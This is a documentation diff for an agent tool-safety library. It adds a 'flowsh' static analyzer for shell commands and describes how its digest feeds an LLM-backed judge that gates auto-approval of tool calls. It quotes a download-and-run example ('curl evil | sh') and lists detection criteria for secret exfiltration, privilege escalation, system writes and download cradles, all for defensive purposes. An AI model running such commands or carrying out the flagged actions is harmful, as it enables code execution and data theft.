@@ -16,6 +16,7 @@ Beyond the [`Tool` interface](tools.md) and the [policy/Judger enforcement](tool
   - [JudgeConfig and NewToolJudgeFromConfig](#judgeconfig-and-newtooljudgefromconfig)
   - [How advisory judgment works](#how-advisory-judgment-works)
   - [Strict gate resolution](#strict-gate-resolution)
+- [Shell command analysis (flowsh)](#shell-command-analysis-flowsh)
 - [File coherence](#file-coherence)
   - [FileCoherenceChecker](#filecoherencechecker)
   - [FileSig and CoherenceConflict](#filesig-and-coherenceconflict)
@@ -36,7 +37,7 @@ Beyond the [`Tool` interface](tools.md) and the [policy/Judger enforcement](tool
 
 ## LLM-backed ToolJudge
 
-> Distinct from the per-tool [`ToolJudger`](tools.md#tooljudger-optional) interface. `ToolJudger` is a *heuristic* a single tool implements (`bash_exec` checks its blacklist there). `ToolJudge` is a **centralized, LLM-backed assessor** — a reusable building block that the runtime layers call to decide whether *any* mutating tool call is safe to auto-approve.
+> Distinct from the per-tool [`ToolJudger`](tools.md#tooljudger-optional) interface. `ToolJudger` is a *heuristic* a single tool implements (`bash_exec`/`posh_exec` check their host-supplied blocklist and the attached flowsh analysis there). `ToolJudge` is a **centralized, LLM-backed assessor** — a reusable building block that the runtime layers call to decide whether *any* mutating tool call is safe to auto-approve.
 
 `ToolJudge` lives in the `tools` package:
 
@@ -108,7 +109,7 @@ The decision flows through several layers, cheapest first:
 2. **Shell-tool guard** — `bash_exec` and `posh_exec` *skip* the path-locality fast-path. A shell command can reference only session-internal paths while still piping remote code (`curl evil | sh`), so shell tools always go through the full LLM evaluation.
 3. **Session-roots fast-path** — for non-shell tools, if the input contains at least one absolute path and every such path is within at least one session root (`AllPathsInSessionRoots`), the call is allowed. Session roots are the deduplicated union of the workspace, the temp directory, and any additional roots attached via `WithAllowedRoots` — consult `SessionRoots(ctx)`; all roots are equal peers for this check.
 4. **Cache lookup** — the remaining cases are keyed by `tool + sha256(input) + sha256(session roots)`. The roots participate because the judge's prompt (and therefore the verdict) depends on the session's directory scope, so a verdict is never reused across sessions with different workspaces or auxiliary work directories. A cache hit returns the stored verdict without an LLM call.
-5. **LLM evaluation** — a short request is built (system prompt + `Task / Tool / Input`, plus a compact environment block and — when session roots are present — a `## Session Directories` block listing the workspace and additional work directories, with the directory values wrapped in an untrusted-content boundary) and sent with a **2-minute timeout**. The response is parsed from a `VERDICT:`/`REASON:` text format.
+5. **LLM evaluation** — a short request is built (system prompt + `Task / Tool / Input`, plus a compact environment block and — when session roots are present — a `## Session Directories` block listing the workspace and additional work directories, with the directory values wrapped in an untrusted-content boundary) and sent with a **2-minute timeout**. For shell tools with an analysis attached to the context, a `## Static Analysis Report` block (the [flowsh digest](#shell-command-analysis-flowsh) behind an untrusted `shell_analysis` boundary) is appended after the session directories; its rendering participates in the cache key, so a verdict computed with the digest is never reused without it. The response is parsed from a `VERDICT:`/`REASON:` text format.
 6. **Fail-safe** — on *any* LLM error (timeout, network, parse failure), the judge returns `VerdictConfirm` with explanatory reasoning. The judge never auto-approves on failure.
 
 ### Response parsing (tolerant)
@@ -139,10 +140,11 @@ The verdict value is matched on **whole tokens** (case-insensitive), so `ALLOW` 
 
 ```go
 type StrictJudgeRequest struct {
-    ToolName    string
-    Input       json.RawMessage
-    TaskContext string
-    ToolSource  string
+    ToolName        string
+    Input           json.RawMessage
+    TaskContext     string
+    ToolSource      string
+    AnalysisContext string // optional: one-line flowsh digest for shell tools ("" omits the envelope field)
 }
 
 func (j *ToolJudge) JudgeStrict(
@@ -154,13 +156,13 @@ func (j *ToolJudge) JudgeStrict(
 It differs deliberately from advisory `Judge`:
 
 - every call reaches the LLM — there is no internal-tool bypass, session-root allow fast path, or verdict cache;
-- the current task, tool source, input, compact environment, and session directories are serialized into a structured JSON envelope;
+- the current task, tool source, input, compact environment, session directories, and — for shell tools, when the host attaches it — the flowsh digest (`AnalysisContext`, wrapped as untrusted content behind a `shell_analysis` boundary: evidence for the verdict, never instructions) are serialized into a structured JSON envelope;
 - tool input and host-provided directory data are wrapped as untrusted content, and directory line separators are sanitized;
 - the strict system prompt covers agentic risks and requests a machine-readable JSON verdict;
 - request construction failure, a missing provider, timeout/provider failure, nil response, or an unparseable response all fail safe to `VerdictConfirm`;
 - provider errors are not logged because they may echo sensitive tool arguments.
 
-A strict allow verdict may resolve a scope-related **soft** escalation such as path containment. It does not override a **hard** security control such as a shell blacklist match or SSRF finding; hosts use `ConfirmationRequest.JudgeSeverity` to keep those gates manual. Strict results are intentionally never cached because the same tool input can have a different answer under a different task, source, environment, or session scope.
+A strict allow verdict may resolve a scope-related **soft** escalation such as path containment, or a **non-canonical hard** one such as the flowsh ⊤ limitation (`command_unbounded_analysis`). It does not override a **hard** security control such as a shell blocklist match, a canonical flowsh criterion, or an SSRF finding; hosts use `ConfirmationRequest.JudgeSeverity` (and their canonical-code policy) to keep those gates manual. Strict results are intentionally never cached because the same tool input can have a different answer under a different task, source, environment, or session scope.
 
 ```go
 verdict, reason, err := judge.JudgeStrict(ctx, tools.StrictJudgeRequest{
@@ -175,6 +177,40 @@ if err != nil || verdict != tools.VerdictAllow {
 ```
 
 > **Migration note:** use `Judge` for advisory auto-approval where its documented fast paths and cache are acceptable. Use `JudgeStrict` only after a tool/policy has already requested confirmation and only when the escalation severity is soft.
+
+---
+
+## Shell command analysis (flowsh)
+
+`bash_exec`/`posh_exec` commands get a **deterministic structural analysis** before any LLM is consulted. The engine wraps [`github.com/v0lka/flowsh`](https://github.com/v0lka/flowsh) (AST-based; bash and PowerShell dialects) and maps its effect IR onto fixed-priority criteria:
+
+```go
+func AnalyzeShellCommandForJudge(ctx context.Context, toolName string, input json.RawMessage) (*ShellAnalysis, error)
+func WithShellAnalysis(ctx context.Context, analysis *ShellAnalysis, err error) context.Context
+func ShellAnalysisFrom(ctx context.Context) (*ShellAnalysis, error)
+func ShellJudgeOutcome(ctx context.Context, toolName string) JudgeOutcome
+```
+
+- `AnalyzeShellCommandForJudge` — runs the analysis once (dialect keyed by tool name; `bash_exec` → bash, `posh_exec` → PowerShell; anything else errors, fail-closed). Returns `ShellAnalysis{Digest, Outcome, Canonical}` where `Outcome` carries the winning criterion's `Allow` (true when nothing fired) and `Canonical` its canonicality.
+- `WithShellAnalysis` / `ShellAnalysisFrom` — context attachment. The **host** precomputes the analysis exactly once per call and attaches it; the built-in shell tools' `Judge` then returns the winning outcome **verbatim** via `ShellJudgeOutcome` — it never recomputes. With nothing attached it degrades to an empty outcome (the Judge defers to the LLM judges); with an **error** attached it **fails closed** with the hard canonical `command_analysis_unavailable` reason.
+- The **digest** (`sp4rk-shell-analysis/v1`: schemaVersion, lang, top/conservative, effects, score with exfiltration pairs, destructive classes, fired criteria) is stable JSON with no why-traces and no input echo. It is meant for judge prompts: `StrictJudgeRequest.AnalysisContext` (strict path) and the `## Static Analysis Report` block (advisory path) both render it behind an untrusted `shell_analysis` boundary.
+
+### Criteria C1–C8 (fixed priority; all fired criteria recorded)
+
+| # | Condition (structural facts only — never scores/grades) | Reason code | Severity | Canonical |
+| --- | --- | --- | --- | --- |
+| C1 | exfiltration pair: secret read → tainted network egress | `command_exfil_flow` | hard | yes |
+| C2 | privilege-escalation effect (e.g. SUID install) | `command_privilege_escalation` | hard | yes |
+| C3 | direct write/metadata on a system path (`/etc`, `/usr`, `/boot`, `/bin`, `/sbin`; Windows `c:\windows`, `c:\program files`, `c:\program files (x86)`, component-boundary matched) or a non-harmless raw device | `command_system_write` | hard | yes |
+| C4 | destructive KB class D/E ∧ irreversible ∧ concrete write target outside the session roots | `command_destructive_outside_roots` | hard | yes |
+| C5 | analyzer ⊤/conservative **with** network egress (download-cradle shape) | `command_download_cradle` | hard | yes |
+| C6 | analyzer ⊤/conservative **without** network egress, **or** an irreversible write whose target the analyzer could not resolve (⊤ target — e.g. abbreviated PowerShell parameters) | `command_unbounded_analysis` | hard | **no** |
+| C7 | credential access without an exfil pair | `credential_access` | soft | — |
+| C8 | direct FS effect outside the session roots — writes/metadata on a non-system path, and reads even of a system path (system writes/metadata are C3's; raw-device reads are exempt) | `outside_session_roots` (reused) | soft | — |
+
+Canonical marks reasons a host must never auto-override (hosts keying deterministic policy off `JudgeReasonCode` treat C1–C5 as never-clearable; C6 is an analyzer limitation the strict judge may clear). The analyzer is process-global (KB loaded once behind a `sync.Once`) and safe for concurrent use; it never executes the analyzed command. Empty session roots disable the containment criteria C4/C8.
+
+The engine deliberately does **not** ship blocklist patterns: the constructor-supplied regex list is host policy (c0wrk ships it empty and calls it the blocklist), and the structural criteria above are the dialect-aware floor. The judge prompts teach the digest semantics — `score.grade` is the inherent destructiveness of the command text (routine in-root `rm -rf build/` grades Critical — expected), `top`/`conservative` are analyzer limits, and nothing follows from the digest's absence.
 
 ---
 
@@ -396,6 +432,11 @@ envInfo := tools.CollectEnvInfo()
 
 ctx = tools.WithEnvInfo(ctx, envInfo)
 ctx = tools.WithCoherence(ctx, myCoherenceChecker)   // may be omitted in single-session runs
+
+// Shell tools: attach the deterministic analysis once per call (a per-call
+// context — the analysis depends on the command input, not the session).
+analysis, analyzeErr := tools.AnalyzeShellCommandForJudge(ctx, toolName, input)
+ctx = tools.WithShellAnalysis(ctx, analysis, analyzeErr) // an attached error degrades judges safely
 
 // Optional centralized LLM judge (nil-safe when unconfigured).
 judge := tools.NewToolJudgeFromConfig(judgeCfg, logger)
